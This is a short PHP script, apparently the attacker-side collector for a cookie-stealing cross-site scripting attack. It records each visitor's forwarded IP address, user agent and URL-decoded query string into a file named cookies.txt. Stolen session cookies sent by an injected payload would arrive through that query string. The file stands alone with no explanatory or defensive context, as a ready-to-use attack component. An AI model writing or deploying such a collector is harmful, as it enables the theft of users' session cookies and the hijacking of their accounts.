<?php

$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
$ua=$_SERVER['HTTP_USER_AGENT'];

$fp=fopen("cookies.txt", "a+");

fwrite($fp, $ip.' '.$ua."\n");
fwrite($fp, urldecode($_SERVER["QUERY_STRING"])."\n\n");
fclose($fp);

?>
